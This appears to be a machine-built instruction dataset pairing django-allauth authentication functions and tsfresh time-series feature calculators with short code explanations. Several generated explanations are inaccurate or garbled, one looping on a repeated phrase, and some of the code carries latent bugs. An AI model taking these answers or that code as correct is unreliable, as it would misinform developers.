{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nrequest a URL at url with params being either the POST or GET data.", "response": "def query(self, url, method=\"GET\", params=dict(), headers=dict()):\n        \"\"\"\n        Request a API endpoint at ``url`` with ``params`` being either the\n        POST or GET data.\n        \"\"\"\n        access_token = self._get_at_from_session()\n        oauth = OAuth1(\n            self.consumer_key,\n            client_secret=self.secret_key,\n            resource_owner_key=access_token['oauth_token'],\n            resource_owner_secret=access_token['oauth_token_secret'])\n        response = getattr(requests, method.lower())(url,\n                                                     auth=oauth,\n                                                     headers=headers,\n                                                     params=params)\n        if response.status_code != 200:\n            raise OAuthError(\n                _('No access to private resources at \"%s\".')\n                % get_token_prefix(self.request_token_url))\n\n        return response.text"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_next_redirect_url(request, redirect_field_name=\"next\"):\n    redirect_to = get_request_param(request, redirect_field_name)\n    if not get_adapter(request).is_safe_url(redirect_to):\n        redirect_to = None\n    return redirect_to", "response": "Returns the next URL to redirect to if the request parameter is not passed."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngetting or sets a user model field.", "response": "def user_field(user, field, *args):\n    \"\"\"\n    Gets or sets (optional) user model fields. No-op if fields do not exist.\n    \"\"\"\n    if not field:\n        return\n    User = get_user_model()\n    try:\n        field_meta = User._meta.get_field(field)\n        max_length = field_meta.max_length\n    except FieldDoesNotExist:\n        if not hasattr(user, field):\n            return\n        max_length = None\n    if args:\n        # Setter\n        v = args[0]\n        if v:\n            v = v[0:max_length]\n        setattr(user, field, v)\n    else:\n        # Getter\n        return getattr(user, field)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef perform_login(request, user, email_verification,\n                  redirect_url=None, signal_kwargs=None,\n                  signup=False):\n    \"\"\"\n    Keyword arguments:\n\n    signup -- Indicates whether or not sending the\n    email is essential (during signup), or if it can be skipped (e.g. in\n    case email verification is optional and we are only logging in).\n    \"\"\"\n    # Local users are stopped due to form validation checking\n    # is_active, yet, adapter methods could toy with is_active in a\n    # `user_signed_up` signal. Furthermore, social users should be\n    # stopped anyway.\n    adapter = get_adapter(request)\n    if not user.is_active:\n        return adapter.respond_user_inactive(request, user)\n\n    from .models import EmailAddress\n    has_verified_email = EmailAddress.objects.filter(user=user,\n                                                     verified=True).exists()\n    if email_verification == EmailVerificationMethod.NONE:\n        pass\n    elif email_verification == EmailVerificationMethod.OPTIONAL:\n        # In case of OPTIONAL verification: send on signup.\n        if not has_verified_email and signup:\n            send_email_confirmation(request, user, signup=signup)\n    elif email_verification == EmailVerificationMethod.MANDATORY:\n        if not has_verified_email:\n            send_email_confirmation(request, user, signup=signup)\n            return adapter.respond_email_verification_sent(\n                request, user)\n    try:\n        adapter.login(request, user)\n        response = HttpResponseRedirect(\n            get_login_redirect_url(request, redirect_url))\n\n        if signal_kwargs is None:\n            signal_kwargs = {}\n        signals.user_logged_in.send(sender=user.__class__,\n                                    request=request,\n                                    response=response,\n                                    user=user,\n                                    **signal_kwargs)\n        adapter.add_message(\n            request,\n            messages.SUCCESS,\n            'account/messages/logged_in.txt',\n            {'user': user})\n    except ImmediateHttpResponse as e:\n        response = e.response\n    return response", "response": "Perform login and return a response."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef cleanup_email_addresses(request, addresses):\n    from .models import EmailAddress\n    adapter = get_adapter(request)\n    # Let's group by `email`\n    e2a = OrderedDict()  # maps email to EmailAddress\n    primary_addresses = []\n    verified_addresses = []\n    primary_verified_addresses = []\n    for address in addresses:\n        # Pick up only valid ones...\n        email = valid_email_or_none(address.email)\n        if not email:\n            continue\n        # ... and non-conflicting ones...\n        if (app_settings.UNIQUE_EMAIL and\n                EmailAddress.objects.filter(email__iexact=email).exists()):\n            continue\n        a = e2a.get(email.lower())\n        if a:\n            a.primary = a.primary or address.primary\n            a.verified = a.verified or address.verified\n        else:\n            a = address\n            a.verified = a.verified or adapter.is_email_verified(request,\n                                                                 a.email)\n            e2a[email.lower()] = a\n        if a.primary:\n            primary_addresses.append(a)\n            if a.verified:\n                primary_verified_addresses.append(a)\n        if a.verified:\n            verified_addresses.append(a)\n    # Now that we got things sorted out, let's assign a primary\n    if primary_verified_addresses:\n        primary_address = primary_verified_addresses[0]\n    elif verified_addresses:\n        # Pick any verified as primary\n        primary_address = verified_addresses[0]\n    elif primary_addresses:\n        # Okay, let's pick primary then, even if unverified\n        primary_address = primary_addresses[0]\n    elif e2a:\n        # Pick the first\n        primary_address = e2a.keys()[0]\n    else:\n        # Empty\n        primary_address = None\n    # There can only be one primary\n    for a in e2a.values():\n        a.primary = primary_address.email.lower() == a.email.lower()\n    return list(e2a.values()), primary_address", "response": "Takes a list of EmailAddress instances and cleans up the list of EmailAddress objects that are not already in the list of valid e - mail addresses."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef setup_user_email(request, user, addresses):\n    from .models import EmailAddress\n\n    assert not EmailAddress.objects.filter(user=user).exists()\n    priority_addresses = []\n    # Is there a stashed e-mail?\n    adapter = get_adapter(request)\n    stashed_email = adapter.unstash_verified_email(request)\n    if stashed_email:\n        priority_addresses.append(EmailAddress(user=user,\n                                               email=stashed_email,\n                                               primary=True,\n                                               verified=True))\n    email = user_email(user)\n    if email:\n        priority_addresses.append(EmailAddress(user=user,\n                                               email=email,\n                                               primary=True,\n                                               verified=False))\n    addresses, primary = cleanup_email_addresses(\n        request,\n        priority_addresses + addresses)\n    for a in addresses:\n        a.user = user\n        a.save()\n    EmailAddress.objects.fill_cache_for_user(user, addresses)\n    if (primary and email and email.lower() != primary.email.lower()):\n        user_email(user, primary.email)\n        user.save()\n    return primary", "response": "Sets up proper EmailAddress for the user that was just signed up."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef send_email_confirmation(request, user, signup=False):\n    from .models import EmailAddress, EmailConfirmation\n\n    cooldown_period = timedelta(\n        seconds=app_settings.EMAIL_CONFIRMATION_COOLDOWN\n    )\n\n    email = user_email(user)\n    if email:\n        try:\n            email_address = EmailAddress.objects.get_for_user(user, email)\n            if not email_address.verified:\n                if app_settings.EMAIL_CONFIRMATION_HMAC:\n                    send_email = True\n                else:\n                    send_email = not EmailConfirmation.objects.filter(\n                        sent__gt=now() - cooldown_period,\n                        email_address=email_address).exists()\n                if send_email:\n                    email_address.send_confirmation(request,\n                                                    signup=signup)\n            else:\n                send_email = False\n        except EmailAddress.DoesNotExist:\n            send_email = True\n            email_address = EmailAddress.objects.add_email(request,\n                                                           user,\n                                                           email,\n                                                           signup=signup,\n                                                           confirm=True)\n            assert email_address\n        # At this point, if we were supposed to send an email we have sent it.\n        if send_email:\n            get_adapter(request).add_message(\n                request,\n                messages.INFO,\n                'account/messages/'\n                'email_confirmation_sent.txt',\n                {'email': email})\n    if signup:\n        get_adapter(request).stash_user(request, user_pk_to_url_str(user))", "response": "Sends an email confirmation mail to the user."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nsynchronize user. email with the user. emailaddress_set.", "response": "def sync_user_email_addresses(user):\n    \"\"\"\n    Keep user.email in sync with user.emailaddress_set.\n\n    Under some circumstances the user.email may not have ended up as\n    an EmailAddress record, e.g. in the case of manually created admin\n    users.\n    \"\"\"\n    from .models import EmailAddress\n    email = user_email(user)\n    if email and not EmailAddress.objects.filter(user=user,\n                                                 email__iexact=email).exists():\n        if app_settings.UNIQUE_EMAIL \\\n                and EmailAddress.objects.filter(email__iexact=email).exists():\n            # Bail out\n            return\n        EmailAddress.objects.create(user=user,\n                                    email=email,\n                                    primary=False,\n                                    verified=False)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef filter_users_by_email(email):\n    from .models import EmailAddress\n    User = get_user_model()\n    mails = EmailAddress.objects.filter(email__iexact=email)\n    users = [e.user for e in mails.prefetch_related('user')]\n    if app_settings.USER_MODEL_EMAIL_FIELD:\n        q_dict = {app_settings.USER_MODEL_EMAIL_FIELD + '__iexact': email}\n        users += list(User.objects.filter(**q_dict))\n    return list(set(users))", "response": "Return list of users by email address"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef setup_dummy_social_apps(sender, **kwargs):\n    from allauth.socialaccount.providers import registry\n    from allauth.socialaccount.models import SocialApp\n    from allauth.socialaccount.providers.oauth.provider import OAuthProvider\n    from allauth.socialaccount.providers.oauth2.provider import OAuth2Provider\n    from django.contrib.sites.models import Site\n\n    site = Site.objects.get_current()\n    for provider in registry.get_list():\n        if (isinstance(provider, OAuth2Provider)\n                or isinstance(provider, OAuthProvider)):\n            try:\n                SocialApp.objects.get(provider=provider.id,\n                                      sites=site)\n            except SocialApp.DoesNotExist:\n                print (\"Installing dummy application credentials for %s.\"\n                       \" Authentication via this provider will not work\"\n                       \" until you configure proper credentials via the\"\n                       \" Django admin (`SocialApp` models)\" % provider.id)\n                app = SocialApp.objects.create(\n                    provider=provider.id,\n                    secret='secret',\n                    client_id='client-id',\n                    name='Dummy %s app' % provider.id)\n                app.sites.add(site)", "response": "Setup dummy social applications for OAuth based providers."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning value dumped to string.", "response": "def value_from_object(self, obj):\n        \"\"\"Return value dumped to string.\"\"\"\n        val = super(JSONField, self).value_from_object(obj)\n        return self.get_prep_value(val)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef EMAIL_VERIFICATION(self):\n        ret = self._setting(\"EMAIL_VERIFICATION\",\n                            self.EmailVerificationMethod.OPTIONAL)\n        # Deal with legacy (boolean based) setting\n        if ret is True:\n            ret = self.EmailVerificationMethod.MANDATORY\n        elif ret is False:\n            ret = self.EmailVerificationMethod.OPTIONAL\n        return ret", "response": "Returns the e - mail verification method."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef PASSWORD_MIN_LENGTH(self):\n        from django.conf import settings\n        ret = None\n        if not settings.AUTH_PASSWORD_VALIDATORS:\n            ret = self._setting(\"PASSWORD_MIN_LENGTH\", 6)\n        return ret", "response": "Returns the minimum password length for the user."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef calculate_best_chunk_size(self, data_length):\n        chunk_size, extra = divmod(data_length, self.n_workers * 5)\n        if extra:\n            chunk_size += 1\n        return chunk_size", "response": "Calculates the best chunk size for a list of length data_length."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef map_reduce(self, map_function, data, function_kwargs=None, chunk_size=None, data_length=None):\n        if data_length is None:\n            data_length = len(data)\n\n        if not chunk_size:\n            chunk_size = self.calculate_best_chunk_size(data_length)\n\n        chunk_generator = self.partition(data, chunk_size=chunk_size)\n\n        map_kwargs = {\"map_function\": map_function, \"kwargs\": function_kwargs}\n\n        if hasattr(self, \"progressbar_title\"):\n            total_number_of_expected_results = math.ceil(data_length / chunk_size)\n            result = tqdm(self.distribute(_function_with_partly_reduce, chunk_generator, map_kwargs),\n                          total=total_number_of_expected_results,\n                          desc=self.progressbar_title, disable=self.disable_progressbar)\n        else:\n            result = self.distribute(_function_with_partly_reduce, chunk_generator, map_kwargs),\n\n        result = list(itertools.chain.from_iterable(result))\n\n        return result", "response": "This method maps a function to each element of the data and reduces the results to return a flattened list."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef distribute(self, func, partitioned_chunks, kwargs):\n        return map(partial(func, **kwargs), partitioned_chunks)", "response": "Calculates the features in a sequential fashion by pythons map command"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef distribute(self, func, partitioned_chunks, kwargs):\n        result = self.client.gather(self.client.map(partial(func, **kwargs), partitioned_chunks))\n        return [item for sublist in result for item in sublist]", "response": "Distribute the function func to the local cluster and return the features in a parallel fashion."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ncalculate the optimal chunk size for a dask cluster entry.", "response": "def calculate_best_chunk_size(self, data_length):\n        \"\"\"\n        Uses the number of dask workers in the cluster (during execution time, meaning when you start the extraction)\n        to find the optimal chunk_size.\n\n        :param data_length: A length which defines how many calculations there need to be.\n        :type data_length: int\n        \"\"\"\n        n_workers = len(self.client.scheduler_info()[\"workers\"])\n        chunk_size, extra = divmod(data_length, n_workers * 5)\n        if extra:\n            chunk_size += 1\n        return chunk_size"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ndistribute the function to a thread pool and return the features in a parallel fashion.", "response": "def distribute(self, func, partitioned_chunks, kwargs):\n        \"\"\"\n        Calculates the features in a parallel fashion by distributing the map command to a thread pool\n\n        :param func: the function to send to each worker.\n        :type func: callable\n        :param partitioned_chunks: The list of data chunks - each element is again\n            a list of chunks - and should be processed by one worker.\n        :type partitioned_chunks: iterable\n        :param kwargs: parameters for the map function\n        :type kwargs: dict of string to parameter\n\n        :return: The result of the calculation as a list - each item should be the result of the application of func\n            to a single element.\n        \"\"\"\n        return self.pool.imap_unordered(partial(func, **kwargs), partitioned_chunks)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nclosing the thread pool and terminate the thread pool.", "response": "def close(self):\n        \"\"\"\n        Collects the result from the workers and closes the thread pool.\n        \"\"\"\n        self.pool.close()\n        self.pool.terminate()\n        self.pool.join()"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef from_columns(columns, columns_to_ignore=None):\n\n    kind_to_fc_parameters = {}\n\n    if columns_to_ignore is None:\n        columns_to_ignore = []\n\n    for col in columns:\n        if col in columns_to_ignore:\n            continue\n\n        if not isinstance(col, basestring):\n            raise TypeError(\"Column name {} should be a string or unicode\".format(col))\n\n        # Split according to our separator into <col_name>, <feature_name>, <feature_params>\n        parts = col.split('__')\n        n_parts = len(parts)\n\n        if n_parts == 1:\n            raise ValueError(\"Splitting of columnname {} resulted in only one part.\".format(col))\n\n        kind = parts[0]\n        feature_name = parts[1]\n\n        if kind not in kind_to_fc_parameters:\n            kind_to_fc_parameters[kind] = {}\n\n        if not hasattr(feature_calculators, feature_name):\n            raise ValueError(\"Unknown feature name {}\".format(feature_name))\n\n        config = get_config_from_string(parts)\n        if config:\n            if feature_name in kind_to_fc_parameters[kind]:\n                kind_to_fc_parameters[kind][feature_name].append(config)\n            else:\n                kind_to_fc_parameters[kind][feature_name] = [config]\n        else:\n            kind_to_fc_parameters[kind][feature_name] = None\n\n    return kind_to_fc_parameters", "response": "Creates a mapping from kind names to fc_parameters objects."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nrolls 1D array elements.", "response": "def _roll(a, shift):\n    \"\"\"\n    Roll 1D array elements. Improves the performance of numpy.roll() by reducing the overhead introduced from the \n    flexibility of the numpy.roll() method such as the support for rolling over multiple dimensions. \n    \n    Elements that roll beyond the last position are re-introduced at the beginning. Similarly, elements that roll\n    back beyond the first position are re-introduced at the end (with negative shift).\n    \n    Examples\n    --------\n    >>> x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\n    >>> _roll(x, shift=2)\n    >>> array([8, 9, 0, 1, 2, 3, 4, 5, 6, 7])\n    \n    >>> x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\n    >>> _roll(x, shift=-2)\n    >>> array([2, 3, 4, 5, 6, 7, 8, 9, 0, 1])\n    \n    >>> x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\n    >>> _roll(x, shift=12)\n    >>> array([8, 9, 0, 1, 2, 3, 4, 5, 6, 7])\n    \n    Benchmark\n    ---------\n    >>> x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\n    >>> %timeit _roll(x, shift=2)\n    >>> 1.89 \u00b5s \u00b1 341 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n    \n    >>> x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])\n    >>> %timeit np.roll(x, shift=2)\n    >>> 11.4 \u00b5s \u00b1 776 ns per loop (mean \u00b1 std. dev. of 7 runs, 100000 loops each)\n    \n    :param a: the input array\n    :type a: array_like\n    :param shift: the number of places by which elements are shifted\n    :type shift: int\n\n    :return: shifted array with the same shape as a\n    :return type: ndarray\n    \"\"\"\n    if not isinstance(a, np.ndarray):\n        a = np.asarray(a)\n    idx = shift % len(a)\n    return np.concatenate([a[-idx:], a[:-idx]])"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nestimate the coefficients of a random variational system of the given time series.", "response": "def _estimate_friedrich_coefficients(x, m, r):\n    \"\"\"\n    Coefficients of polynomial :math:`h(x)`, which has been fitted to\n    the deterministic dynamics of Langevin model\n    .. math::\n        \\dot{x}(t) = h(x(t)) + \\mathcal{N}(0,R)\n\n    As described by\n\n        Friedrich et al. (2000): Physics Letters A 271, p. 217-222\n        *Extracting model equations from experimental data*\n\n    For short time-series this method is highly dependent on the parameters.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param m: order of polynom to fit for estimating fixed points of dynamics\n    :type m: int\n    :param r: number of quantils to use for averaging\n    :type r: float\n\n    :return: coefficients of polynomial of deterministic dynamics\n    :return type: ndarray\n    \"\"\"\n    assert m > 0, \"Order of polynomial need to be positive integer, found {}\".format(m)\n\n    df = pd.DataFrame({'signal': x[:-1], 'delta': np.diff(x)})\n    try:\n        df['quantiles'] = pd.qcut(df.signal, r)\n    except ValueError:\n        return [np.NaN] * (m + 1)\n\n    quantiles = df.groupby('quantiles')\n\n    result = pd.DataFrame({'x_mean': quantiles.signal.mean(), 'y_mean': quantiles.delta.mean()})\n    result.dropna(inplace=True)\n\n    try:\n        return np.polyfit(result.x_mean, result.y_mean, deg=m)\n    except (np.linalg.LinAlgError, ValueError):\n        return [np.NaN] * (m + 1)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _aggregate_on_chunks(x, f_agg, chunk_len):\n    return [getattr(x[i * chunk_len: (i + 1) * chunk_len], f_agg)() for i in range(int(np.ceil(len(x) / chunk_len)))]", "response": "Takes the time series x and creates a lower sampled version of it by applying the aggregation function f_agg on consecutive chunks of length chunk_len and returns the list of the aggregation function over the chunks of length chunk_len"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef set_property(key, value):\n    def decorate_func(func):\n        setattr(func, key, value)\n        if func.__doc__ and key == \"fctype\":\n            func.__doc__ = func.__doc__ + \"\\n\\n    *This function is of type: \" + value + \"*\\n\"\n        return func\n    return decorate_func", "response": "This method returns a decorator that sets the property key of the function to value"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef variance_larger_than_standard_deviation(x):\n    y = np.var(x)\n    return y > np.sqrt(y)", "response": "Returns a boolean variable denoting if the variance of x is greater than its standard deviation."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef ratio_beyond_r_sigma(x, r):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return np.sum(np.abs(x - np.mean(x)) > r * np.std(x))/x.size", "response": "Ratio of values that are more than r * std ( x so r sigma away from the mean of x."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nchecks if the maximum value of x is observed more than once", "response": "def has_duplicate_max(x):\n    \"\"\"\n    Checks if the maximum value of x is observed more than once\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :return: the value of this feature\n    :return type: bool\n    \"\"\"\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return np.sum(x == np.max(x)) >= 2"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef has_duplicate_min(x):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return np.sum(x == np.min(x)) >= 2", "response": "Checks if the minimal value of x is observed more than once"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef has_duplicate(x):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return x.size != np.unique(x).size", "response": "Checks if any value in x occurs more than once"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ncalculates the partial autocorrelation function at the given lag.", "response": "def partial_autocorrelation(x, param):\n    \"\"\"\n    Calculates the value of the partial autocorrelation function at the given lag. The lag `k` partial autocorrelation\n    of a time series :math:`\\\\lbrace x_t, t = 1 \\\\ldots T \\\\rbrace` equals the partial correlation of :math:`x_t` and\n    :math:`x_{t-k}`, adjusted for the intermediate variables\n    :math:`\\\\lbrace x_{t-1}, \\\\ldots, x_{t-k+1} \\\\rbrace` ([1]).\n    Following [2], it can be defined as\n\n    .. math::\n\n        \\\\alpha_k = \\\\frac{ Cov(x_t, x_{t-k} | x_{t-1}, \\\\ldots, x_{t-k+1})}\n        {\\\\sqrt{ Var(x_t | x_{t-1}, \\\\ldots, x_{t-k+1}) Var(x_{t-k} | x_{t-1}, \\\\ldots, x_{t-k+1} )}}\n\n    with (a) :math:`x_t = f(x_{t-1}, \\\\ldots, x_{t-k+1})` and (b) :math:`x_{t-k} = f(x_{t-1}, \\\\ldots, x_{t-k+1})`\n    being AR(k-1) models that can be fitted by OLS. Be aware that in (a), the regression is done on past values to\n    predict :math:`x_t` whereas in (b), future values are used to calculate the past value :math:`x_{t-k}`.\n    It is said in [1] that \"for an AR(p), the partial autocorrelations [ :math:`\\\\alpha_k` ] will be nonzero for `k<=p`\n    and zero for `k>p`.\"\n    With this property, it is used to determine the lag of an AR-Process.\n\n    .. rubric:: References\n\n    |  [1] Box, G. E., Jenkins, G. M., Reinsel, G. C., & Ljung, G. M. (2015).\n    |  Time series analysis: forecasting and control. John Wiley & Sons.\n    |  [2] https://onlinecourses.science.psu.edu/stat510/node/62\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :param param: contains dictionaries {\"lag\": val} with int val indicating the lag to be returned\n    :type param: list\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    # Check the difference between demanded lags by param and possible lags to calculate (depends on len(x))\n    max_demanded_lag = max([lag[\"lag\"] for lag in param])\n    n = len(x)\n\n    # Check if list is too short to make calculations\n    if n <= 1:\n        pacf_coeffs = [np.nan] * (max_demanded_lag + 1)\n    else:\n        if (n <= max_demanded_lag):\n            max_lag = n - 1\n        else:\n            max_lag = max_demanded_lag\n        pacf_coeffs = list(pacf(x, method=\"ld\", nlags=max_lag))\n        pacf_coeffs = pacf_coeffs + [np.nan] * max(0, (max_demanded_lag - max_lag))\n\n    return [(\"lag_{}\".format(lag[\"lag\"]), pacf_coeffs[lag[\"lag\"]]) for lag in param]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef abs_energy(x):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return np.dot(x, x)", "response": "Returns the absolute energy of the time series which is the sum over the squared values\n   "}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef mean_second_derivative_central(x):\n\n    diff = (_roll(x, 1) - 2 * np.array(x) + _roll(x, -1)) / 2.0\n    return np.mean(diff[1:-1])", "response": "Returns the mean value of a central approximation of the second derivative of the central approximation of the second derivative."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef skewness(x):\n    if not isinstance(x, pd.Series):\n        x = pd.Series(x)\n    return pd.Series.skew(x)", "response": "Returns the sample skewness of x."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef kurtosis(x):\n    if not isinstance(x, pd.Series):\n        x = pd.Series(x)\n    return pd.Series.kurtosis(x)", "response": "Returns the kurtosis of x"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the length of the longest consecutive subsequence in x that is smaller than the mean of x", "response": "def longest_strike_below_mean(x):\n    \"\"\"\n    Returns the length of the longest consecutive subsequence in x that is smaller than the mean of x\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return np.max(_get_length_sequences_where(x <= np.mean(x))) if x.size > 0 else 0"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef count_above_mean(x):\n    m = np.mean(x)\n    return np.where(x > m)[0].size", "response": "Returns the number of values in x that are higher than the mean of x"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns the number of values in x that are lower than the mean of x", "response": "def count_below_mean(x):\n    \"\"\"\n    Returns the number of values in x that are lower than the mean of x\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    m = np.mean(x)\n    return np.where(x < m)[0].size"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the relative last location of the maximum value of x.", "response": "def last_location_of_maximum(x):\n    \"\"\"\n    Returns the relative last location of the maximum value of x.\n    The position is calculated relatively to the length of x.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    x = np.asarray(x)\n    return 1.0 - np.argmax(x[::-1]) / len(x) if len(x) > 0 else np.NaN"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef first_location_of_maximum(x):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return np.argmax(x) / len(x) if len(x) > 0 else np.NaN", "response": "Returns the first location of the maximum value of x."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns the last location of the minimal value of x.", "response": "def last_location_of_minimum(x):\n    \"\"\"\n    Returns the last location of the minimal value of x.\n    The position is calculated relatively to the length of x.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    x = np.asarray(x)\n    return 1.0 - np.argmin(x[::-1]) / len(x) if len(x) > 0 else np.NaN"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef first_location_of_minimum(x):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    return np.argmin(x) / len(x) if len(x) > 0 else np.NaN", "response": "Returns the first location of the minimal value of x."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the percentage of unique values that occurring more than once in the time series x.", "response": "def percentage_of_reoccurring_datapoints_to_all_datapoints(x):\n    \"\"\"\n    Returns the percentage of unique values, that are present in the time series\n    more than once.\n\n        len(different values occurring more than once) / len(different values)\n\n    This means the percentage is normalized to the number of unique values,\n    in contrast to the percentage_of_reoccurring_values_to_all_values.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    if len(x) == 0:\n        return np.nan\n\n    unique, counts = np.unique(x, return_counts=True)\n\n    if counts.shape[0] == 0:\n        return 0\n\n    return np.sum(counts > 1) / float(counts.shape[0])"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef percentage_of_reoccurring_values_to_all_values(x):\n    if not isinstance(x, pd.Series):\n        x = pd.Series(x)\n\n    if x.size == 0:\n        return np.nan\n\n    value_counts = x.value_counts()\n    reoccuring_values = value_counts[value_counts > 1].sum()\n\n    if np.isnan(reoccuring_values):\n        return 0\n\n    return reoccuring_values / x.size", "response": "Returns the ratio of unique values that occurring more than once to all values."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning the sum of all values that are present in the time series more than once.", "response": "def sum_of_reoccurring_values(x):\n    \"\"\"\n    Returns the sum of all values, that are present in the time series\n    more than once.\n\n    :param x: the time series to calculate the feature of\n    :type x: numpy.ndarray\n    :return: the value of this feature\n    :return type: float\n    \"\"\"\n    unique, counts = np.unique(x, return_counts=True)\n    counts[counts < 2] = 0\n    counts[counts > 1] = 1\n    return np.sum(counts * unique)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef sum_of_reoccurring_data_points(x):\n    unique, counts = np.unique(x, return_counts=True)\n    counts[counts < 2] = 0\n    return np.sum(counts * unique)", "response": "Returns the sum of all data points that are present in the time series\n    more than once."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef ratio_value_number_to_time_series_length(x):\n    if not isinstance(x, (np.ndarray, pd.Series)):\n        x = np.asarray(x)\n    if x.size == 0:\n        return np.nan\n\n    return np.unique(x).size / x.size", "response": "Returns a factor which is 1 if all values in the time series occur only once and below one if all values in the time series occur only once and below one if all values in the time series occur only once and below one if this is not the case."}
